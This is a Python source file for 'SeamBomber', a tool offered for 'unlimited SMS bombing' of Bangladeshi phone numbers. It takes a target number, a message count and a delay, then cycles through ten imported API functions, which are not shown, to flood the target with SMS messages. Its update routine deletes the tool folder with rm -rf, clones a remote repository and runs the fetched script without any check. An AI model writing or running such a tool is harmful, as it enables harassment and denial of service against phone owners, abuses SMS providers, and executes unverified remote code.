# SeamBomber
# Tool : Unlimited SMS Bombing In Bangladeshi Numbers
#Author : Sh-Seam
# Coder : SeamCoder

import time
import requests
import sys
import os
import shutil
from more.data import *

#Get Rows and Columns of Screen
columns = shutil.get_terminal_size().columns

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

#Check Update
def update():
    try:
        toolVersion = open("./more/.version", "r").read()
    except:
        toolVersion = "Seam"
    
    try:
        mainVersion = requests.get("https://raw.githubusercontent.com/Sh-Seam/seam/main/more/.version").text
    except:
        psb("\n\u001b[31;1m    [!]\u001b[32;1m Please Connect To The Internet! \u001b[34;1m")
        time.sleep(1)
        l = input("\u001b[31;1m    [*]\u001b[32;1m Press Enter To Continue...\u001b[34;1m")
        update()
    
    #If Tool Version Is Same, Then Return/Close Function
    if (toolVersion == mainVersion):
        return
    
    psb("\n\033[92m    [\033[37m!\033[92m] Tool Update Found!\u001b[34;1m")
    time.sleep(0.5)
    psb("\033[92m    [\033[37m!\033[92m] Updating Tool...\u001b[34;1m")
    
    os.system("cd .. && rm -rf seam && git clone https://github.com/Sh-Seam/seam")
    psb("\n\033[92m    [\033[37m*\033[92m] Update Complete!\u001b[34;1m")
    psb("\033[92m    [\033[37m*\033[92m] Starting Tool...\u001b[34;1m")
    time.sleep(0.8)
    
    os.system("cd .. && cd seam && python seam.py")


#Logo
def logo():
    os.system("clear")
    print("\u001b[32;1m-- ╔════════════════════════════════════════════════════════╗")
    print("\u001b[32;1m-- ║         \u001b[31;1m ░██████╗███████╗░█████╗░███╗░░░███╗\u001b[32;1m           ║")
    print("\u001b[32;1m-- ║         \u001b[31;1m ██╔════╝██╔════╝██╔══██╗████╗░████║\u001b[32;1m           ║")
    print("\u001b[32;1m-- ║         \u001b[31;1m ╚█████╗░█████╗░░███████║██╔████╔██║\u001b[32;1m           ║")
    print("\u001b[32;1m-- ║         \u001b[31;1m ░╚═══██╗██╔══╝░░██╔══██║██║╚██╔╝██║\u001b[32;1m           ║")
    print("\u001b[32;1m-- ║         \u001b[31;1m ██████╔╝███████╗██║░░██║██║░╚═╝░██║\u001b[32;1m           ║")
    print("\u001b[32;1m-- ║         \u001b[31;1m ╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝\u001b[32;1m           ║")
    print("\u001b[32;1m-- ╠════════════════════════════════════════════════════════╣")
    print("\u001b[32;1m-- ║ Author  : Seam                                         ║")
    print("\u001b[32;1m-- ║ Tool    : Unlimited SMS Bomber                         ║")
    print("\u001b[32;1m-- ║ GitHub : https://github.com/Sh-Seam/seam               ║")
    print("\u001b[32;1m-- ║ Website : https://sh-seam.github.io/Twist-X/Bar.html   ║")
    print("\u001b[32;1m-- ║ Coder   : Seam coder                                   ║")
    print("\u001b[32;1m-- ╚════════════════════════════════════════════════════════╝ \u001b[34;1m")


#Options Banner
def banner():
    amount = str(main.amount)
    if (len(amount) == 1):
        amount = amount + "                    "
    elif (len(amount) == 2):
        amount = amount + "                   "
    elif (len(amount) == 3):
        amount = amount + "                  "
    elif (len(amount) == 4):
        amount = amount + "                 "
    #print(" ", end="")
    print("\033[95m-" * (columns), end = "")
    #print(" ")
    print(("\033[92mTarget  : \033[37m0" + main.number + "          ").center(columns + 10))
    print(("\033[92mAmount  : \033[37m" + amount).center(columns + 10))
    print("\033[92mProcess : \033[37mStarted               ".center(columns + 10))
    print("\033[92mNote    : \033[37mPress ctrl + z To Stop".center(columns + 10))
    #print(" ", end="")
    print("\033[95m-" * (columns), end = "")
    print("\n\u001b[34;1m")


#Check SMS Sent and Process
def check(sent):
    amount = main.amount
    delay = main.delay
    
    print("\r\033[92m    [\033[94m#\033[92m] Massage Sent : \033[94m[\033[37m" + str(sent) + "\033[94m]\033[37m", end="\u001b[34;1m")
    
    if (sent == amount):
        psb("\n\n\033[92m    [\033[37m*\033[92m] Bombing Finished!\u001b[34;1m")
        psb("\033[92m    [\033[37m*\033[92m] Amount : \033[37m\u001b[34;1m" + str(amount))
        psb("\033[92m    [\033[37m*\033[92m] Target : \033[37m0\u001b[34;1m" + main.number)
        psb("\033[92m    [\033[37m*\033[92m] From   : \033[37mSeamBomber\n\u001b[34;1m")
        time.sleep(0.6)
        print("\033[92m[\033[93m★\033[92m] Thanks For Using Our Tool \033[92m[\033[93m★\033[92m]\u001b[34;1m".center(columns + 30))
        print("\u001b[34;1m")
        
        return True
    else:
        time.sleep(delay)
        return False


#Get Target Number
def getNumber():
    number = input("\n    \u001b[32;1m[*] \u001b[34;1mEnter Target Number:> \u001b[34;1m")
    try:
        int(number)
    except:
        psb("\n\u001b[31;1m    [!]\u001b[32;1m Please Enter a Correct Number!\u001b[34;1m")
        number = getNumber()
    if not (len(number) == 11):
        psb("\n\u001b[31;1m    [!]\u001b[32;1m Please Enter 11 Digit Number!\u001b[34;1m")
        number = getNumber()
    
    return number


#Main    
def main():
    number = getNumber()
    number = number[-10:]
    main.number = number
    
    amount = input("    \033[92m[\033[37m*\033[92m] Enter Amount (\033[37mDefault: 10\033[92m):> \u001b[34;1m")
    try:
        amount = int(amount)
    except:
        amount = 10
    
    main.amount = amount
    
    delay = input("    \033[92m[\033[37m*\033[92m] Enter Time(\033[37mSec\033[92m) Delay (\033[37mDefault: 2s\033[92m):> \u001b[34;1m")
    try:
        int(delay)
    except:
        delay = 2
    
    main.delay = int(delay)
    
    time.sleep(1)
    logo()
    banner()
    sent = 0
    while True:
        code = api1(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api2(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api3(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api4(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api5(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api6(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api7(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api8(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api9(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
        code = api10(number)
        if (code == 200):
            sent += 1
            if(check(sent)):
                break
        
if __name__ == "__main__":
    logo()
    update()
    main()
